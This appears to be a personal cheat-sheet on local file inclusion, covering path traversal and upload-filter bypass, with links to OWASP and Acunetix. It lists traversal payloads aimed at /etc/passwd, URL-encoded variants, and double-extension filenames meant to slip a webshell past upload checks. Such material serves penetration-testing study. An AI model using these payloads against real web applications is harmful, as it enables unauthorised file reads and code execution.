# Local File Inclusion {LFI}

# Overview

+ LFI vulnrabilities refer to any scenario where an attacker is able to induce the web application/web server into accessing or executing files on the host
+ The 'included' files may be attacker uploaded scripts, files which exist already on the web server (or OS filesystem), or another users files

# LFI Types

+ LFI is a relativley broad category of vulnrability which is generally very specific to the web application
+ There are however a number of common LFI vulnrabilities and 'common' scenarios

## Path/Directory Traversal

+ Path traversal is a typical LFI vulnrability which leads to the ability to include files from host servers file system (include those from the web application) which lie outside of the web hosts `root directory`
+ Path traversal occurs when the web server allows relative path changing to occur
+ In general vulnerable hosts which allow directories to be changed between via `../` notation allows an attacker to climb to higher directories in the file system hirachy

### Approach

+ Path traversal invloves an attacker leveraging the allowance of `../` or its variations to traverse/move to higher directories outside of the web servers root directory
	+ For example on linux based apache servers typically `var/www/html` is the root directory where web server files are hosted

### Payloads

+ Payloads may be appended from places like `domain.com/index.html/payload`
+ Or from URL paramters like `?filename=../../../etc/passwd`

#### General

`/../../../etc/passwd`

`..\`

`....//`

`....\/`

#### Encoded

+ Note the following all represet `../` or `..\` in differing levels of URL encoding

`%2e%2e%2f`

`%2e%2e/`

`..%2f`

`%2e%2e%5c`

`%2e%2e\`

`..%5c`

`%252e%252e%255c`

`..%255c`

`..%c0%af`

### Exfiltration

+ Somtimes a file included via path traversal will not be 'renderable' on the frontend and may instead return in a broken image or another format

#### Images

+ To exfiltrate the contents of an included image through firefox use the network dev tab to download the broken image and cat it or open it in a IDE to see the included content
+ Alternatively use a web proxy to view the raw response

## Inclusion of Dissallowed File Types

### Payloads

+ These may be used in naming files to be uploaded or included in a web application
+ Note: A typical payload may be a webshell or command injection payload

`general_file.payloadFileType.ExpectedFileType`

`profile_image.php.jpeg`

`profile_image.php.png`

`profile_image.php%20.png`


# Resources

+ [OWASP Path traversal](https://owasp.org/www-community/attacks/Path_Traversal)
+ [ACunetix LIF](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/)